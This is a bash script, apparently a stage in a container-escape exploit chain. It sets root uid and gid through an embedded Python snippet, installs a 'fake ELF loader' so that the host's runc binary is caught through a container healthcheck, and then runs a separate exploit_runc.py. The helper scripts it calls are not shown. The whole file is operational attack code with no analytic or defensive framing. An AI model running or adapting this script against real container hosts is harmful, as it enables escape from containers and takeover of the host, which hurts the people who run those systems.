#!/usr/bin/env bash
set -euo pipefail

: "${DCF_WORK:?DCF_WORK must point to the staged exploit directory}"
: "${DCF_PYROOT:?DCF_PYROOT must point to the staged Python root}"
DCF_PY="${DCF_PY:-$DCF_PYROOT/bin/python3}"
: "${DCF_HEALTHBIN:=/bin/busybox}"
: "${DCF_INTERVAL:=5}"
: "${DCF_FAKE_LOADER_SLEEP:=1}"
: "${DCF_FAKE_LOADER_PATH:=}"
: "${DCF_HOST_CMD_TIMEOUT:=240}"

export DCF_WORK DCF_PYROOT DCF_PY
export DCF_HEALTHBIN DCF_INTERVAL DCF_FAKE_LOADER_SLEEP DCF_FAKE_LOADER_PATH DCF_HOST_CMD_TIMEOUT
export LD_LIBRARY_PATH="$DCF_PYROOT/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
export PATH="$DCF_PYROOT/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
export PYTHONDONTWRITEBYTECODE=1

echo "[+] root stage uid=$(id -u)"

"$DCF_PY" - <<'PY'
import os

try:
    os.setgroups([0])
except OSError:
    pass

try:
    os.setgid(0)
    os.setuid(0)
except OSError:
    pass
PY

echo "[+] installing fake ELF loader for host runc catch"
"$DCF_PY" "$DCF_WORK/install_fake_loader.py" install "$DCF_WORK"

echo "[+] catching host runc via healthcheck"
"$DCF_PY" "$DCF_WORK/exploit_runc.py" "$DCF_WORK" "$@"
